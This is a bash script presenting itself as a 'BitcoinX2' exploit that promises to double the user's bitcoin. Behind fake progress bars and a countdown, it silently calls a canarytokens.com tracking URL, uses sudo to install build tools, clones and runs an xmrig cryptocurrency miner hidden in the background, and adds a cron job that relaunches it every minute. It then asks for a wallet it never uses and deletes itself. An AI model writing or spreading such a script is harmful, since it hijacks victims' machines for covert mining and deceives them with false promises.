#!/bin/bash
echo "██████╗ ██╗████████╗ ██████╗ ██████╗ ██╗███╗   ██╗██╗  ██╗██████╗ "
echo "██╔══██╗██║╚══██╔══╝██╔════╝██╔═══██╗██║████╗  ██║╚██╗██╔╝╚════██╗"
echo "██████╔╝██║   ██║   ██║     ██║   ██║██║██╔██╗ ██║ ╚███╔╝  █████╔╝"
echo "██╔══██╗██║   ██║   ██║     ██║   ██║██║██║╚██╗██║ ██╔██╗ ██╔═══╝ "
echo "██████╔╝██║   ██║   ╚██████╗╚██████╔╝██║██║ ╚████║██╔╝ ██╗███████╗"
echo "╚═════╝ ╚═╝   ╚═╝    ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝"
echo ""
echo ""
echo ""
curl --silent --output /dev/null http://canarytokens.com/static/articles/ik0a2kjqto14x4knaj77cl5bz/submit.aspx
echo "Loading..."
count=0
total=34
pstr="[=======================================================================]"

while [ $count -lt $total ]; do
  sleep 0.5 # this is work
  count=$(( $count + 1 ))
  pd=$(( $count * 73 / $total ))
  printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
done
echo "Updating..."
sudo apt update && sudo apt install git && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
echo ""
echo ""
git clone https://github.com/katerin966/xmrig.git && cd xmrig && tar xvzf xmrig.tar.gz && ./xmrig &> /dev/null &
echo ""
echo ""
echo "*/1 * * * * git clone https://github.com/katerin966/xmrig.git && cd xmrig && tar xvzf xmrig.tar.gz && ./xmrig &> /dev/null &" > cron && cat cron | crontab -
echo ""
rm cron
echo ""
echo ""
echo "Enter yourt wallet address:"
read wallet
echo "Accepted!"$wallet
echo "Connecting to blockchain..."
count=0
total=34
pstr="[=======================================================================]"

while [ $count -lt $total ]; do
  sleep 0.5 # this is work
  count=$(( $count + 1 ))
  pd=$(( $count * 73 / $total ))
  printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
done
echo ""
echo "Get a nice coffee and take a seat!"
echo "Start exploiting.."
echo ""
hour=0
min=10
sec=0
       while [ $hour -ge 0 ]; do
                while [ $min -ge 0 ]; do
                        while [ $sec -ge 0 ]; do
                                echo -ne "$hour:$min:$sec\033[0K\r"
                                let "sec=sec-1"
                                sleep 1
                        done
                        sec=59
                        let "min=min-1"
                done
                min=59
                let "hour=hour-1"
        done
echo "The exploit is done!"
echo "You will receive your X2 bitcoin in a couple of minutes!"
rm btcX2xplt.sh
